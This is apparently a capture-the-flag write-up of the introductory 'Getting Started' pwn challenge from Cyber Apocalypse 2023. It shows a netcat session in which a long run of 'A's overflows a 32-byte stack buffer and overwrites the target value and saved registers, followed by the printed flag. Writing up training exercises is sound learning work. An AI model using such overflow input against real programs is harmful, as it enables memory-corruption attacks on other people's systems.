---
layout: default
title: Getting Started
---

# [Cyber Apocalypse 2023](index.md) - Pwn - Getting Started

> Get ready for the last guided challenge and your first real exploit. It's time to show your hacking skills.

This one is less of a challenge, more of a tutorial.

```
$ nc 159.65.94.38 31385


Stack frame layout

|      .      | <- Higher addresses
|      .      |
|_____________|
|             | <- 64 bytes
| Return addr |
|_____________|
|             | <- 56 bytes
|     RBP     |
|_____________|
|             | <- 48 bytes
|   target    |
|_____________|
|             | <- 40 bytes
|  alignment  |
|_____________|
|             | <- 32 bytes
|  Buffer[31] |
|_____________|
|      .      |
|      .      |
|_____________|
|             |
|  Buffer[0]  |
|_____________| <- Lower addresses


      [Addr]       |      [Value]
-------------------+-------------------
0x00007fff3dc436d0 | 0x0000000000000000 <- Start of buffer
0x00007fff3dc436d8 | 0x0000000000000000
0x00007fff3dc436e0 | 0x0000000000000000
0x00007fff3dc436e8 | 0x0000000000000000
0x00007fff3dc436f0 | 0x6969696969696969 <- Dummy value for alignment
0x00007fff3dc436f8 | 0x00000000deadbeef <- Target to change
0x00007fff3dc43700 | 0x00005617826b3800 <- Saved rbp
0x00007fff3dc43708 | 0x00007f93db807c87 <- Saved return address
0x00007fff3dc43710 | 0x0000000000000001
0x00007fff3dc43718 | 0x00007fff3dc437e8


After we insert 4 "A"s, (the hex representation of A is 0x41), the stack layout like this:


      [Addr]       |      [Value]
-------------------+-------------------
0x00007fff3dc436d0 | 0x0000000041414141 <- Start of buffer
0x00007fff3dc436d8 | 0x0000000000000000
0x00007fff3dc436e0 | 0x0000000000000000
0x00007fff3dc436e8 | 0x0000000000000000
0x00007fff3dc436f0 | 0x6969696969696969 <- Dummy value for alignment
0x00007fff3dc436f8 | 0x00000000deadbeef <- Target to change
0x00007fff3dc43700 | 0x00005617826b3800 <- Saved rbp
0x00007fff3dc43708 | 0x00007f93db807c87 <- Saved return address
0x00007fff3dc43710 | 0x0000000000000001
0x00007fff3dc43718 | 0x00007fff3dc437e8


After we insert 4 "B"s, (the hex representation of B is 0x42), the stack layout looks like this:


      [Addr]       |      [Value]
-------------------+-------------------
0x00007fff3dc436d0 | 0x4242424241414141 <- Start of buffer
0x00007fff3dc436d8 | 0x0000000000000000
0x00007fff3dc436e0 | 0x0000000000000000
0x00007fff3dc436e8 | 0x0000000000000000
0x00007fff3dc436f0 | 0x6969696969696969 <- Dummy value for alignment
0x00007fff3dc436f8 | 0x00000000deadbeef <- Target to change
0x00007fff3dc43700 | 0x00005617826b3800 <- Saved rbp
0x00007fff3dc43708 | 0x00007f93db807c87 <- Saved return address
0x00007fff3dc43710 | 0x0000000000000001
0x00007fff3dc43718 | 0x00007fff3dc437e8

◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
◉                                                                                                 ◉
◉  Fill the 32-byte buffer, overwrite the alginment address and the "target's" 0xdeadbeef value.  ◉
◉                                                                                                 ◉
◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉�A�◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉

>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA


      [Addr]       |      [Value]
-------------------+-------------------
0x00007fff3dc436d0 | 0x4141414141414141 <- Start of buffer
0x00007fff3dc436d8 | 0x4141414141414141
0x00007fff3dc436e0 | 0x4141414141414141
0x00007fff3dc436e8 | 0x4141414141414141
0x00007fff3dc436f0 | 0x4141414141414141 <- Dummy value for alignment
0x00007fff3dc436f8 | 0x4141414141414141 <- Target to change
0x00007fff3dc43700 | 0x4141414141414141 <- Saved rbp
0x00007fff3dc43708 | 0x0041414141414141 <- Saved return address
0x00007fff3dc43710 | 0x0000000000000001
0x00007fff3dc43718 | 0x00007fff3dc437e8

HTB{b0f_s33m5_3z_r1ght?}

[-] You failed!
```
I'm guessing that it wasn't supposed to say "You failed!" and also give the flag... or maybe it was, since the point was to glitch it out with a buffer overflow.

In any case, we got the flag.

```
HTB{b0f_s33m5_3z_r1ght?}
```

I did try to _exactly_ fill the target address (with 48 'B's or 'A's), and it still said "You failed!", so I have to assume that it's supposed to work like this.